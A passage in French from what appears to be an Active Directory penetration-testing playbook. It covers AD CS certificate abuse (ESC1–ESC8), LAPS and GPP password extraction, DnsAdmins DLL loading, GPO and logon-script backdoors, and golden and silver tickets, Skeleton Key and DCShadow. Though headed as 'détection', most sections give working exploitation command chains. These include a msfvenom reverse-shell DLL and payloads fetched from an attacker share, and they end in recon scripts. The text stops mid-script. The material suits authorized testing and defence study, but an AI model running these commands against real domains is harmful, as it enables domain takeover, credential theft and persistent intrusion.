## Phase 4 : Détection des Failles AD CS (Certificate Services) {#phase4}

**Prérequis pour toute exploitation AD CS** :
- AD CS doit être déployé dans le domaine
- Tu dois avoir au minimum des creds utilisateur de base

### 4.0 Détecter la Présence d'AD CS

**Méthode 1 : Via DNS** :
```bash
# Rechercher le SRV record
nslookup -type=SRV _ldap._tcp.pki._msdcs.domain.local
dig SRV _ldap._tcp.pki._msdcs.domain.local
```

**Méthode 2 : Via LDAP** :
```bash
# Rechercher les PKI objects
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "CN=Configuration,DC=domain,DC=local" "(objectClass=pKIEnrollmentService)" dNSHostName

# Résultat exemple:
# dNSHostName: ca-server.domain.local
```

**Méthode 3 : Via SMB** :
```bash
# Rechercher les shares CertSrv / CertEnroll
crackmapexec smb 10.10.10.0/24 --shares | grep -i cert
```

**Méthode 4 : Via Certipy** :
```bash
# Scanner le domaine
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10

# Output : Fichier JSON + fichier texte avec tous les templates vulnérables
```

### 4.1 Détection ESC1 - Client Authentication + ENROLLEE_SUPPLIES_SUBJECT

**Vulnérabilité** :
- Template permet `Client Authentication` EKU
- Flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` activé
- User peut enroll

**Comment détecter** :

**Via Certipy** :
```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable -stdout

# Chercher dans l'output :
# [!] Template 'VulnerableTemplate' has dangerous permissions
# Enrollment Rights: DOMAIN\Domain Users
# Extended Key Usage: Client Authentication
# Enrollee Supplies Subject: True
```

**Via LDAP (manuel)** :
```bash
# Extraire tous les certificate templates
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" "(objectClass=pKICertificateTemplate)" name msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage

# Analyser :
# - msPKI-Certificate-Name-Flag doit contenir le flag 1 (ENROLLEE_SUPPLIES_SUBJECT)
# - pKIExtendedKeyUsage doit contenir 1.3.6.1.5.5.7.3.2 (Client Authentication)
```

**Flags à vérifier** :

**msPKI-Certificate-Name-Flag** :
```
1 (0x1) = CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT  ✅ VULNÉRABLE
```

**msPKI-Enrollment-Flag** :
```
1 (0x1) = INCLUDE_SYMMETRIC_ALGORITHMS
2 (0x2) = PEND_ALL_REQUESTS  ⚠️ (requiert approbation manuelle)
```

**pKIExtendedKeyUsage (EKU)** :
```
1.3.6.1.5.5.7.3.2 = Client Authentication  ✅ Nécessaire pour Kerberos auth
1.3.6.1.5.5.7.3.1 = Server Authentication
2.5.29.37.0       = Any Purpose  ✅ Inclut Client Auth
```

**Vérifier les permissions d'enrollment** :
```bash
# Qui peut enroll sur ce template ?
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -stdout | grep -A 20 "VulnerableTemplate"

# Chercher :
# Enrollment Rights: DOMAIN\Domain Users  ✅ Tout le monde peut enroll
```

**Exploitation** :
```bash
# 1. Demander un certificat en tant qu'Administrator
certipy req -u user@domain.local -p password -ca 'CA-NAME' -template 'VulnerableTemplate' -upn administrator@domain.local -dns dc.domain.local

# -upn : User Principal Name (pour auth Kerberos)
# -dns : DNS name (pour auth machine)

# 2. Récupérer le certificat (si pending)
certipy req -u user@domain.local -p password -ca 'CA-NAME' -retrieve <Request-ID>

# 3. Authentification
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10

# Output: TGT + hash NT de Administrator
```

**Indicateurs de succès** :
- Certificat `.pfx` généré
- `certipy auth` retourne un hash NT

### 4.2 Détection ESC2 - Any Purpose EKU

**Vulnérabilité** : Template avec EKU = "Any Purpose" ou pas d'EKU

**Détection LDAP** :
```bash
# Template sans EKU définie
ldapsearch ... "(!(pKIExtendedKeyUsage=*))" name

# Template avec Any Purpose
ldapsearch ... "(pKIExtendedKeyUsage=2.5.29.37.0)" name
```

**Exploitation** : Identique à ESC1

### 4.3 Détection ESC3 - Certificate Request Agent

**Vulnérabilité** :
- Template permet `Certificate Request Agent` EKU (1.3.6.1.4.1.311.20.2.1)
- User peut enroll
- Un autre template accepte les requêtes via agent

**Détection** :
```bash
# Templates avec Certificate Request Agent
ldapsearch ... "(pKIExtendedKeyUsage=1.3.6.1.4.1.311.20.2.1)" name msPKI-RA-Signature

# msPKI-RA-Signature = 0  ✅ Pas de signature requise (exploitable)
```

**Via Certipy** :
```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable | grep -i "request agent"
```

**Exploitation** :
```bash
# 1. Obtenir certificat Request Agent
certipy req -u user@domain.local -p password -ca 'CA' -template 'RequestAgentTemplate'

# 2. Utiliser pour demander un certificat pour Administrator
certipy req -u user@domain.local -p password -ca 'CA' -template 'UserTemplate' -on-behalf-of 'domain\administrator' -pfx agent.pfx

# 3. Auth avec le certificat admin
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

### 4.4 Détection ESC4 - Vuln Template ACL

**Vulnérabilité** : Tu as WriteDacl/WriteOwner/WriteProperty sur un template

**Détection BloodHound** :
```cypher
MATCH p=(u:User)-[:GenericAll|GenericWrite|WriteDacl|WriteOwner]->(ct:CertTemplate)
WHERE u.name = "USER@DOMAIN.LOCAL"
RETURN p
```

**Détection PowerView** :
```powershell
Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser myuser).objectsid}
```

**Détection Certipy** :
```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable | grep -A 10 "Permissions"
```

**Exploitation** :
```bash
# 1. Modifier le template pour le rendre vulnérable (ESC1)
certipy template -u user@domain.local -p password -template 'SafeTemplate' -configuration ESC1

# Configuration ESC1 ajoute :
# - ENROLLEE_SUPPLIES_SUBJECT flag
# - Client Authentication EKU

# 2. Exploiter comme ESC1
certipy req -u user@domain.local -p password -ca 'CA' -template 'SafeTemplate' -upn administrator@domain.local

# 3. Remettre le template dans son état original (cleanup)
certipy template -u user@domain.local -p password -template 'SafeTemplate' -configuration <original_config>
```

### 4.5 Détection ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2

**Vulnérabilité** : Flag CA permettant de spécifier SAN dans n'importe quel template

**Flag** : `EDITF_ATTRIBUTESUBJECTALTNAME2` sur l'objet CA

**Détection** :
```bash
# Via Certipy
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"

# Via LDAP
ldapsearch ... "(objectClass=pKIEnrollmentService)" flags

# flags doit contenir 0x00040000 (EDITF_ATTRIBUTESUBJECTALTNAME2)
```

**Exploitation** :
```bash
# N'importe quel template devient exploitable
certipy req -u user@domain.local -p password -ca 'CA' -template 'User' -upn administrator@domain.local
```

**Note** : Patché dans les versions récentes mais encore présent sur anciennes CAs.

### 4.6 Détection ESC7 - Vuln CA ACL

**Vulnérabilité** : Tu as `ManageCA` ou `ManageCertificates` sur la CA

**Détection** :
```bash
# Via Certipy
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable

# Chercher dans output :
# CA Permissions:
#   Manage CA: DOMAIN\User  ✅ VULNÉRABLE
```

**Exploitation avec ManageCA** :
```bash
# 1. Activer le flag EDITF_ATTRIBUTESUBJECTALTNAME2
certipy ca -u user@domain.local -p password -ca 'CA-NAME' -enable-template 'User'

# 2. Exploiter comme ESC6
```

**Exploitation avec ManageCertificates** :
```bash
# Approuver des certificats en attente
certipy ca -u user@domain.local -p password -ca 'CA-NAME' -issue-request <Request-ID>
```

### 4.7 Détection ESC8 - HTTP Enrollment + NTLM Relay

**Vulnérabilité** :
- CA expose enrollment via HTTP (Web Enrollment)
- NTLM authentication acceptée
- EPA (Extended Protection for Authentication) désactivée

**Détection** :
```bash
# Vérifier si HTTP enrollment est accessible
curl -I http://ca-server.domain.local/certsrv/

# Réponse HTTP 401 avec WWW-Authenticate: NTLM  ✅ VULNÉRABLE
```

**Via Certipy** :
```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 | grep -i "HTTP"

# Chercher :
# Web Enrollment: Enabled
# EPA: Disabled  ✅ VULNÉRABLE
```

**Exploitation** :
```bash
# 1. Setup ntlmrelayx vers l'endpoint enrollment
ntlmrelayx.py -t http://ca-server.domain.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 2. Forcer un DC à s'authentifier (PetitPotam)
python3 PetitPotam.py -u user -p password attacker-ip dc.domain.local

# 3. ntlmrelayx relay la connexion et demande un certificat
# Output: Certificat pour DC$ machine account

# 4. Utiliser le certificat
certipy auth -pfx dc.pfx -dc-ip 10.10.10.10

# 5. DCSync avec le hash du DC
secretsdump.py -hashes :hash dc.domain.local
```

**Vérifier EPA (Extended Protection)** :
```powershell
# Sur le serveur CA
Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\HTTP\Parameters" -Name "EnableCertificateMappingCheck"

# = 0 ou absent  ✅ VULNÉRABLE (EPA disabled)
# = 1            ❌ NON VULNÉRABLE (EPA enabled)
```

### 4.8 Récapitulatif Détection AD CS

**Commande unique pour tout scanner** :
```bash
certipy find -u user@domain.local -p password -dc-ip 10.10.10.10 -vulnerable -stdout

# Analyse le output pour :
# - ESC1/2/3 : Templates avec mauvaises configs
# - ESC4 : ACLs modifiables sur templates
# - ESC6 : Flag EDITF_ATTRIBUTESUBJECTALTNAME2
# - ESC7 : ACLs sur CA
# - ESC8 : HTTP enrollment
```

---

## Phase 5 : Détection des Configurations Dangereuses {#phase5}

### 5.1 Détection LAPS (Local Admin Password Solution)

**Si LAPS est déployé** : Les passwords admin locaux sont stockés dans AD

**Comment savoir si LAPS est présent** :
```bash
# Via LDAP : Chercher l'attribut ms-Mcs-AdmPwd
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=computer)" name ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# Si l'attribut existe = LAPS est déployé
```

**Via PowerView** :
```powershell
Get-DomainComputer | Where-Object {$_."ms-Mcs-AdmPwd" -ne $null} | Select-Object name,"ms-Mcs-AdmPwd"
```

**Qui peut lire les passwords LAPS** :
```powershell
# ACLs sur l'attribut ms-Mcs-AdmPwd
Get-DomainObjectAcl -SearchBase "OU=Computers,DC=domain,DC=local" | Where-Object {$_.ObjectAceType -eq "ms-Mcs-AdmPwd"} | Select-Object SecurityIdentifier,ObjectDN
```

**Si tu peux lire** :
```bash
# Extraire le password
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(name=TARGET-PC)" ms-Mcs-AdmPwd

# Output : ms-Mcs-AdmPwd: P@ssw0rd123Complex!
```

**Utilisation** :
```bash
crackmapexec smb target-pc.domain.local -u Administrator -p 'P@ssw0rd123Complex!'
```

### 5.2 Détection GPP Passwords (Group Policy Preferences)

**Vulnérabilité historique** : Passwords dans XML chiffrés avec clé publique connue

**Comment détecter** :
```bash
# Scanner SYSVOL pour cpassword
findstr /S /I cpassword \\domain.local\sysvol\*.xml

# Ou depuis Linux
smbclient.py domain.local/user:password@dc.domain.local
smb> cd SYSVOL\domain.local\Policies
smb> prompt off
smb> recurse on
smb> mget *

# Puis chercher localement
grep -r "cpassword" .
```

**Fichiers à vérifier** :
```
Groups.xml           ← Passwords de comptes locaux
Services.xml         ← Passwords de services
Scheduledtasks.xml   ← Passwords dans scheduled tasks
DataSources.xml      ← Passwords de connexions DB
```

**Déchiffrement** :
```bash
# Format trouvé : cpassword="j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"
gpp-decrypt "j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"

# Output : P@ssw0rd
```

**Via CrackMapExec** :
```bash
crackmapexec smb 10.10.10.10 -u user -p password -M gpp_password
```

### 5.3 Détection DNS Admin Exploitation

**Groupe** : `DnsAdmins`

**Pourquoi c'est critique** : Membres peuvent charger des DLLs dans le service DNS (qui tourne en SYSTEM sur DC)

**Comment détecter** :
```bash
# Vérifier si ton user est membre
net user myuser /domain

# Via LDAP
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "CN=DnsAdmins,CN=Users,DC=domain,DC=local" member
```

**Via PowerView** :
```powershell
Get-DomainGroupMember "DnsAdmins"
```

**Exploitation** :
```bash
# 1. Créer une DLL malveillante (msfvenom, custom, etc.)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f dll > evil.dll

# 2. Hoster la DLL
smbserver.py -smb2support share /path/to/

# 3. Charger la DLL dans DNS
dnscmd.exe dc.domain.local /config /serverlevelplugindll \\attacker-ip\share\evil.dll

# 4. Redémarrer DNS (requiert des privilèges, mais DnsAdmins les a souvent)
sc.exe \\dc.domain.local stop dns
sc.exe \\dc.domain.local start dns

# 5. Reverse shell en SYSTEM sur le DC
```

### 5.4 Détection Printer Bug / Spooler Service

**Service** : Print Spooler sur les DCs/Servers

**Fonctionnalité** : Permet de forcer une machine à s'authentifier

**Détection si le service est actif** :
```bash
# Via RPC
rpcdump.py domain.local/user:password@target-dc | grep -i spooler

# Via crackmapexec
crackmapexec smb target-dc -u user -p password -M spooler

# Output :
# SPOOLER [+] Spooler service enabled on target-dc
```

**Exploitation** :
```bash
# Forcer le DC à s'authentifier vers toi
python3 printerbug.py domain.local/user@dc.domain.local attacker-machine

# Combo avec :
# - Unconstrained Delegation : Capture TGT
# - NTLM Relay : Relay vers LDAP/SMB
```

**Version alternative : PetitPotam** :
```bash
# Via MS-EFSRPC (plus récent, moins détecté)
python3 PetitPotam.py -u user -p password attacker-ip dc.domain.local
```

### 5.5 Détection Protected Users Group

**Groupe** : `CN=Protected Users,CN=Users,DC=domain,DC=local`

**Protection** : Membres ne peuvent pas :
- Utiliser NTLM/DES/RC4 (seulement Kerberos AES)
- Avoir des credentials en cache > 4h
- Être délégués

**Comment vérifier** :
```bash
# Lister les membres
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "CN=Protected Users,CN=Users,DC=domain,DC=local" member
```

**Pourquoi c'est important** :
- Si tes cibles sont dans Protected Users, Pass-the-Hash ne fonctionnera pas
- Kerberoasting retournera des hashes AES (plus difficiles à cracker)

### 5.6 Détection AdminCount = 1

**Attribut** : `adminCount`

**Signification** : Objet protégé par AdminSDHolder (groupes privilégiés)

**Détection** :
```bash
# Users avec adminCount = 1
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(&(objectClass=user)(adminCount=1))" sAMAccountName memberOf

# Ces users sont probablement (ou ont été) admins
```

**Faux positifs** :
- User retiré d'un groupe admin mais adminCount reste à 1
- = Potentiel "ghost admin" (garde des privilèges résiduels)

---

## Phase 6 : Analyse GPO et Configurations {#phase6}

### 6.1 Détection GPO avec Permissions Modifiables

**Objectif** : Trouver des GPO où tu as GenericAll/GenericWrite

**Via BloodHound** :
```cypher
MATCH p=(u:User {name:"USER@DOMAIN.LOCAL"})-[:GenericAll|GenericWrite]->(g:GPO)
RETURN p
```

**Via PowerView** :
```powershell
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "^S-1-5-21"}
```

**Via Impacket** :
```bash
# Pas d'outil direct, utiliser BloodHound
```

**Informations sur une GPO** :
```powershell
Get-DomainGPO -Identity "GPO-NAME" | Select-Object displayname,gpcfilesyspath
```

**Exploitation** :
```bash
# 1. Modifier la GPO pour ajouter un Immediate Scheduled Task
SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "DOMAIN\Admin" --Command "cmd.exe" --Arguments "/c \\attacker\share\reverse.exe" --GPOName "Vulnerable-GPO"

# 2. Forcer un gpupdate sur une cible (si admin local)
Invoke-GPUpdate -Computer target-pc -Force

# 3. Attendre que la cible applique la GPO
# Task s'exécute en SYSTEM
```

### 6.2 Détection GPO Linkées à des OUs Sensibles

**Objectif** : GPO liée à un OU contenant des serveurs/admins

**Via PowerView** :
```powershell
# GPO liées à l'OU "Domain Controllers"
Get-DomainOU -Identity "Domain Controllers" | Select-Object -ExpandProperty gplink

# Décoder le gplink
Get-DomainGPO -Identity "{GUID-GPO}"
```

**Via LDAP** :
```bash
# Lister les OUs et leurs GPOs
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=organizationalUnit)" distinguishedName gplink
```

**Format gplink** :
```
gplink: [LDAP://cn={GPO-GUID},cn=policies,cn=system,DC=domain,DC=local;0]

;0 = Link enabled
;1 = Link disabled
```

**Pourquoi c'est important** :
- GPO liée à "Domain Controllers" OU = Si tu peux la modifier, tu as les DCs
- GPO liée à "Domain Admins" OU = Code execution sur les postes des admins

### 6.3 Détection Logon Scripts via GPO

**Fichiers** : Scripts dans `\\domain.local\SYSVOL\domain.local\Policies\{GPO-GUID}\USER\Scripts\`

**Détection** :
```bash
# Lister tous les scripts
smbclient.py domain.local/user:password@dc.domain.local
smb> cd SYSVOL\domain.local\Policies
smb> recurse on
smb> ls *\USER\Scripts\*
```

**Vérifier les permissions** :
```bash
smbcacls //dc.domain.local/SYSVOL "domain.local\Policies\{GPO-GUID}\USER\Scripts\Logon\script.bat" -U domain/user%password
```

**Si tu as Write** :
```bash
# Modifier le script
echo "\\attacker\share\backdoor.exe" >> script.bat

# Ou remplacer complètement
smbclient.py domain.local/user:password@dc.domain.local
smb> put backdoor.bat SYSVOL\domain.local\Policies\{GPO-GUID}\USER\Scripts\Logon\script.bat
```

**Résultat** : Tous les users affectés par la GPO exécutent ton script au logon

### 6.4 Détection Password Policies

**Objectif** : Connaître la politique de lockout pour password spraying

**Via LDAP** :
```bash
# Default Domain Policy
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=domain)" pwdProperties lockoutThreshold lockoutDuration minPwdLength

# Fine-Grained Password Policy (FGPP)
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "CN=Password Settings Container,CN=System,DC=domain,DC=local" "(objectClass=msDS-PasswordSettings)" name msDS-LockoutThreshold msDS-MinimumPasswordLength
```

**Via PowerView** :
```powershell
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
```

**Via crackmapexec** :
```bash
crackmapexec smb 10.10.10.10 -u user -p password --pass-pol
```

**Paramètres clés** :
```
lockoutThreshold: 5      → 5 tentatives avant lockout
lockoutDuration: 30      → 30 minutes de lockout
minPwdLength: 8          → Minimum 8 caractères
pwdProperties: 1         → Complexité requise
```

**Stratégie password spraying** :
```
lockoutThreshold = 5
→ Tester maximum 3 passwords (marge de sécurité)
→ Attendre lockoutDuration entre les sprays
```

---

## Phase 7 : Post-Exploitation et Détection de Persistence {#phase7}

### 7.1 Détection AdminSDHolder Backdoor

**Objet** : `CN=AdminSDHolder,CN=System,DC=domain,DC=local`

**Comment détecter si tu as des permissions** :
```powershell
Get-DomainObjectAcl -Identity AdminSDHolder | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser myuser).objectsid}
```

**Si WriteDacl sur AdminSDHolder** :
```powershell
# Ajouter GenericAll pour ton user
Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity myuser -Rights All

# Attendre 60 minutes (ou forcer SDProp)
Invoke-SDPropagator

# Vérifier que tes permissions se sont propagées
Get-DomainObjectAcl -Identity "Domain Admins" | Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser myuser).objectsid}
```

**Résultat** : Tu as maintenant GenericAll sur tous les groupes protégés

### 7.2 Détection Golden Ticket

**Prérequis** : Tu as le hash de `krbtgt`

**Comment obtenir le hash krbtgt** :
```bash
# Via DCSync (requires Replicating Directory Changes rights)
secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user krbtgt

# Via NTDS.dit dump (requires DA or DC compromise)
secretsdump.py -ntds ntds.dit -system system.hive LOCAL
```

**Informations nécessaires** :
```
1. Hash NT du krbtgt
2. Domain SID (S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX)
3. Domain FQDN (domain.local)
```

**Obtenir le Domain SID** :
```bash
# Via LDAP
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w password -b "DC=domain,DC=local" "(objectClass=domain)" objectSid

# Via PowerShell
(Get-ADDomain).DomainSID
```

**Forger Golden Ticket** :
```bash
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain-sid> -domain domain.local Administrator

# Avec options avancées
ticketer.py -nthash <krbtgt_hash> -domain-sid <domain-sid> -domain domain.local -user-id 500 -groups 512,513,518,519,520 -extra-sid <enterprise-admins-sid> Administrator

# -user-id 500 = RID Administrator
# -groups : Domain Admins (512), Domain Users (513), etc.
# -extra-sid : Pour attaquer d'autres domaines de la forêt
```

**Utiliser le Golden Ticket** :
```bash
export KRB5CCNAME=Administrator.ccache
psexec.py domain.local/Administrator@dc.domain.local -k -no-pass
```

**Détection** :
Quasi impossible. Vérifier :
- EventID 4768 (TGT request) avec des SIDs anormaux
- TGT avec durée de vie excessive (> 10h)

### 7.3 Détection Silver Ticket

**Différence** : Ticket pour un SERVICE spécifique, pas un TGT

**Prérequis** : Hash du compte de SERVICE

**Obtenir le hash** :
```bash
# Via Kerberoasting
GetUserSPNs.py domain.local/user:password -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt

# Ou via NTDS/SAM dump
```

**Forger Silver Ticket** :
```bash
# Pour un service CIFS (file sharing)
ticketer.py -nthash <service_hash> -domain-sid <domain-sid> -domain domain.local -spn cifs/target.domain.local Administrator

# Pour MSSQL
ticketer.py -nthash <mssql_hash> -domain-sid <domain-sid> -domain domain.local -spn MSSQLSvc/sql.domain.local:1433 Administrator
```

**Utilisation** :
```bash
export KRB5CCNAME=Administrator.ccache

# Pour CIFS
smbclient.py -k -no-pass target.domain.local

# Pour MSSQL
mssqlclient.py -k -no-pass sql.domain.local
```

### 7.4 Détection Skeleton Key

**Technique** : Patch `lsass.exe` sur un DC pour accepter un master password

**Indicateurs** :
- Impossible à détecter à distance
- Requiert compromission du DC au préalable
- Supprimé au reboot du DC

**Exploitation** (post-DC compromise) :
```bash
# Via Mimikatz
mimikatz # privilege::debug
mimikatz # misc::skeleton

# Master password = "mimikatz" par défaut
```

**Utilisation** :
```bash
# N'importe quel compte avec le password "mimikatz"
crackmapexec smb 10.10.10.10 -u Administrator -p mimikatz

# Fonctionne pour TOUS les comptes du domaine
```

### 7.5 Détection DCShadow

**Technique** : Register un faux DC, pousser des changements AD

**Prérequis** :
- DA ou Enterprise Admin
- Deux sessions : une pour register le DC, une pour pousser les changements

**Indicateurs de détection** :
- Nouveau DC apparaît dans la topologie AD
- Modifications AD sans EventID standard

**Exploitation** :
```bash
# Session 1 : Register fake DC
mimikatz # lsadump::dcshadow /object:target$ /attribute:sidHistory /value:S-1-5-21-...-512

# Session 2 : Push
mimikatz # lsadump::dcshadow /push
```

---

## Phase 8 : Méthodologie BloodHound Approfondie {#bloodhound}

### 8.1 Requêtes Cypher Essentielles

**Chemins d'attaque vers DA** :
```cypher
// Shortest path depuis ton user
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// Tous les chemins (pas juste le plus court)
MATCH p=((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..6]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p
LIMIT 100
```

**Unconstrained Delegation** :
```cypher
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name CONTAINS "DC"
RETURN c.name
```

**Constrained Delegation exploitable** :
```cypher
MATCH (u:User)-[:AllowedToDelegate]->(c:Computer)
WHERE c.name CONTAINS "DC"
RETURN u.name, c.name
```

**AS-REP Roastable** :
```cypher
MATCH (u:User {dontreqpreauth:true})
RETURN u.name
```

**Kerberoastable** :
```cypher
MATCH (u:User {hasspn:true})
WHERE NOT u.name CONTAINS "$"
RETURN u.name, u.serviceprincipalnames
```

**ACL Abuse Paths** :
```cypher
// GenericAll vers DA
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[:GenericAll*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}))
RETURN p

// WriteDacl chains
MATCH p=((u:User {name:"USER@DOMAIN.LOCAL"})-[:WriteDacl*1..3]->(g:Group))
WHERE g.name CONTAINS "ADMIN"
RETURN p
```

**Sessions Admin** :
```cypher
// Où sont loggés les Domain Admins
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN c.name, u.name
```

**High Value Targets** :
```cypher
// Tous les objets high value
MATCH (n {highvalue:true})
RETURN n.name, LABELS(n)

// Chemins vers high value depuis ton user
MATCH p=shortestPath((u:User {name:"USER@DOMAIN.LOCAL"})-[*1..]->(n {highvalue:true}))
RETURN p
```

**Foreign Domain Trusts** :
```cypher
MATCH (n:Domain)-[r:TrustedBy]->(m:Domain)
RETURN n.name, m.name, r.trusttype
```

### 8.2 Custom Queries Avancées

**Users avec passwords dans description** :
```cypher
MATCH (u:User)
WHERE u.description CONTAINS "password" OR u.description CONTAINS "pwd"
RETURN u.name, u.description
```

**Computers sans LAPS** :
```cypher
MATCH (c:Computer)
WHERE c.haslaps = false
RETURN c.name
```

**Objects avec ACL modifiables depuis un groupe low-priv** :
```cypher
MATCH p=(g:Group {name:"DOMAIN USERS@DOMAIN.LOCAL"})-[:GenericAll|WriteDacl|WriteOwner]->(n)
RETURN p
```

**Délégation dangereuse** :
```cypher
MATCH (u)-[:AllowedToDelegate]->(c:Computer)
WHERE c.name CONTAINS "DC" OR c.name CONTAINS "SQL"
RETURN u.name, c.name
```

### 8.3 Analyse de Résultats BloodHound

**Edge types importants** :

**AdminTo** :
- User/Computer a des droits admin locaux sur une machine
- Exploitation : PsExec, WinRM, RDP

**MemberOf** :
- Membership dans un groupe
- Vérifier les imbrications (user → group1 → group2 → DA)

**HasSession** :
- User loggé sur une machine
- Utile pour cibler où aller pour voler des credentials

**GenericAll** :
- Full control sur l'objet
- Exploitation dépend du type d'objet

**WriteDacl / WriteOwner** :
- Modification d'ACLs
- Escalation vers GenericAll

**AllowedToDelegate** :
- Constrained Delegation
- S4U abuse

**Exploitation d'un chemin typique** :
```
User A → GenericAll → User B → MemberOf → Group X → AdminTo → Server Y → HasSession → User Z → MemberOf → Domain Admins

Plan d'attaque :
1. Changer le password de User B (GenericAll)
2. Devenir membre de Group X
3. PsExec sur Server Y (AdminTo)
4. Dumper credentials de User Z (HasSession)
5. Tu es Domain Admin
```

---

## Phase 9 : Scripts d'Automatisation {#automation}

### 9.1 Script Reconnaissance Complète

```bash
#!/bin/bash
# auto_recon.sh

DOMAIN="domain.local"
DC_IP="10.10.10.10"
USER="user"
PASS="password"
OUTPUT_DIR="./recon_output"

mkdir -p $OUTPUT_DIR

echo "[*] Starting AD reconnaissance..."

# 1. BloodHound collection
echo "[+] Running BloodHound..."
bloodhound-python -d $DOMAIN -u $USER -p $PASS -c All -ns $DC_IP --zip > $OUTPUT_DIR/bloodhound.log 2>&1

# 2. Kerberoasting
echo "[+] Checking for Kerberoastable accounts..."
GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile $OUTPUT_DIR/kerberoast_hashes.txt

# 3. AS-REP Roasting
echo "[+] Checking for AS-REP Roastable accounts..."
GetNPUsers.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP -request -outputfile $OUTPUT_DIR/asrep_hashes.txt

# 4. Delegation checks
echo "[+] Checking for delegation issues..."
findDelegation.py $DOMAIN/$USER:$PASS -dc-ip $DC_IP > $OUTPUT_DIR/delegations.txt

# 5. SMB Signing
echo "[+] Checking SMB Signing..."
crackmapexec smb $DC_IP --gen-relay-list $OUTPUT_DIR/relay_targets.txt -u $USER -p $PASS

# 6. Password policy
echo "[+] Extracting password policy..."
crackmapexec smb $DC_IP -u $USER -p $PASS --pass-pol > $OUTPUT_DIR/pass_policy.txt

# 7. AD CS enumeration
echo "[+] Enumerating AD CS..."
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC_IP -vulnerable -stdout > $OUTPUT_DIR/adcs_vulnerable.txt

# 8. LAPS check
echo "[+] Checking LAPS deployment..."
crackmapexec ldap $DC_IP -u $USER -p $PASS -M laps > $OUTPUT_DIR/laps_check.txt

# 9. GPP Passwords
echo "[+] Searching for GPP passwords..."
crackmapexec smb $DC_IP -u $USER -p $PASS -M gpp_password > $OUTPUT_DIR/gpp_passwords.txt

echo "[*] Reconnaissance complete. Results in $OUTPUT_DIR/"
```

### 9.2 Script Prioritization

```python
#!/usr/bin/env python3
# prioritize_targets.py

import json
import sys

def analyze_bloodhound_data(json_file):
    """
    Analyse BloodHound JSON et priorise les cibles
    """
    with open(json_file) as f:
        data = json.load(f)
    
    high_priority = []
    
    # Chercher Unconstrained Delegation (hors DC)
    for computer in data.get('computers', []):
        if computer.get('Properties', {}).get('unconstraineddelegation') == True:
            if 'DC' not in computer['Properties']['name'].upper():
                high_priority.append({
                    'type': 'Unconstrained Delegation',
                    'target': computer['Properties']['name'],
                    'priority': 'CRITICAL'
                })
    
    # Chercher AS-REP Roastable
    for user in data.get('users', []):
        if user.get('Properties', {}).get('dontreqpreauth') == True:
